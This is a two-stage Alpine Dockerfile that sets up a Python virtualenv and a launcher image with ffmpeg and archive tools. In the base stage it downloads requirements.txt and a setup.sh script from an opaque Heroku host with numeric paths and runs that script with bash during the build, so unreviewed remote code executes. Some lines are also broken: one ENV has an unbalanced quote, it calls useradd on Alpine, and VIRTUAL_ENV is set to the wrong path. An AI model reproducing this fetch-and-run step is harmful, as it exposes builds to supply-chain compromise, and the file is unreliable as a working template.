FROM alpine:latest as base

WORKDIR /app

RUN apk add --no-cache \
    python3-dev py3-pip git \
    && apk add --no-cache --virtual .build-deps \
    build-base zlib-dev jpeg-dev \
    libffi-dev

RUN pip3 install --ignore-installed distlib pipenv \
    && python3 -m venv venv && \
    wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub && \
    wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.32-r0/glibc-2.32-r0.apk && \
    apk add glibc-2.32-r0.apk && \
    rm /etc/apk/keys/sgerrand.rsa.pub && \
    rm glibc-2.32-r0.apk && \
    rm -r /var/cache/apk/APKINDEX.*
ENV PATH="/app/venv/bin:$PATH" VIRTUAL_ENV="/venv"

RUN pip3 install --upgrade pip
ADD https://okmk.herokuapp.com/28760401388972/requirements.txt requirements.txt
ADD https://okmk.herokuapp.com/28519883220396/setup.sh setup.sh
RUN bash setup.sh
#RUN CFLAGS="-O0"  
RUN pip3 install --no-cache-dir -r requirements.txt \
    && apk del .build-deps \
    && rm -rf /var/tmp/* && \
    rm -rf /var/cache/apk/* && \
    rm -rf requirements.txt
        
FROM alpine:latest as launcher

RUN useradd -m launcher
WORKDIR /home/launcher

COPY --chown=launcher:launcher --from=base /app/venv /home/launcher/venv

ENV PATH="/home/launcher/venv/bin:$PATH VIRTUAL_ENV="/venv"

RUN apk add --no-cache \
    python3-dev \
    bash curl wget \
    ffmpeg unzip unrar tar && \
    rm -rf /var/cache/apk/*

CMD ["bash"]
